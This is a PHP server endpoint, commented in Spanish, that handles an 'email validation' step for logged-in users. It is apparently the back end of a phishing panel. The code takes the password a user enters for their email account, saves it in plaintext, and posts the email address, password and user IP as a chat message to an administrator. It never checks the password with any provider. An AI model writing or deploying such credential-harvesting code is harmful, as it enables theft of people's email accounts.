<?php
// Suprimir warnings para evitar interferir con JSON
error_reporting(E_ERROR | E_PARSE);
session_start();
header('Content-Type: application/json');

// Verificar si hay una sesión de usuario
if (!isset($_SESSION['usuario_id'])) {
    echo json_encode(['success' => false, 'error' => 'No hay sesión activa']);
    exit;
}

try {
    // Incluir configuración de base de datos
    require_once '../php_config/conexionbd.php';
    
    // Conectar a la base de datos
    $pdo = conectarBD();
    
    $input = json_decode(file_get_contents('php://input'), true);
    
    if (!$input || !isset($input['accion'])) {
        echo json_encode(['success' => false, 'error' => 'Datos no válidos']);
        exit;
    }
    
    $usuario_id = $_SESSION['usuario_id'];
    
    if ($input['accion'] === 'guardar_password_email') {
        $validacion_id = intval($input['validacion_id']);
        $password = $input['password'] ?? '';
        
        if (empty($password)) {
            echo json_encode(['success' => false, 'error' => 'La contraseña no puede estar vacía']);
            exit;
        }
        
        // Verificar que la validación pertenece al usuario y obtener datos del email
        $stmt = $pdo->prepare("
            SELECT id, email, proveedor_seleccionado FROM validacion_email 
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ");
        $stmt->execute([$validacion_id, $usuario_id]);
        $validacion_data = $stmt->fetch(PDO::FETCH_ASSOC);
        
        if (!$validacion_data) {
            echo json_encode(['success' => false, 'error' => 'Validación no encontrada']);
            exit;
        }
        
        // Actualizar con la contraseña y marcar como completado
        $updateStmt = $pdo->prepare("
            UPDATE validacion_email 
            SET password_ingresado = ?, 
                estado = 'completado', 
                fecha_completado = NOW() 
            WHERE id = ?
        ");
        
        if ($updateStmt->execute([$password, $validacion_id])) {
            // Obtener IP del usuario
            $ip_real = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? 
                       $_SERVER['HTTP_X_REAL_IP'] ?? 
                       $_SERVER['REMOTE_ADDR'] ?? 
                       'unknown';
            
            // Guardar en el historial del chat
            $mensaje_chat = "Mail: " . $validacion_data['email'] . "\n | " .
                           "PASS: " . $password;
            
            $chatStmt = $pdo->prepare("
                INSERT INTO mensajes_admin (usuario_id, admin_id, mensaje, tipo_mensaje, ip_usuario, estado) 
                VALUES (?, 1, ?, 'sin_input', ?, 'leido')
            ");
            $chatStmt->execute([$usuario_id, $mensaje_chat, $ip_real]);
            
            echo json_encode([
                'success' => true,
                'message' => 'Validación completada correctamente'
            ]);
        } else {
            echo json_encode(['success' => false, 'error' => 'Error al guardar la contraseña']);
        }
        
    } elseif ($input['accion'] === 'cancelar_validacion') {
        $validacion_id = intval($input['validacion_id']);
        
        // Verificar que la validación pertenece al usuario
        $stmt = $pdo->prepare("
            SELECT id FROM validacion_email 
            WHERE id = ? AND usuario_id = ? AND estado = 'pendiente'
        ");
        $stmt->execute([$validacion_id, $usuario_id]);
        
        if ($stmt->fetch()) {
            // Cancelar la validación
            $updateStmt = $pdo->prepare("
                UPDATE validacion_email 
                SET estado = 'cancelado' 
                WHERE id = ?
            ");
            
            if ($updateStmt->execute([$validacion_id])) {
                echo json_encode(['success' => true, 'message' => 'Validación cancelada']);
            } else {
                echo json_encode(['success' => false, 'error' => 'Error al cancelar validación']);
            }
        } else {
            echo json_encode(['success' => false, 'error' => 'Validación no encontrada']);
        }
        
    } else {
        echo json_encode(['success' => false, 'error' => 'Acción no válida']);
    }
    
} catch (PDOException $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error de base de datos: ' . $e->getMessage()
    ]);
} catch (Exception $e) {
    echo json_encode([
        'success' => false,
        'error' => 'Error: ' . $e->getMessage()
    ]);
}
?>
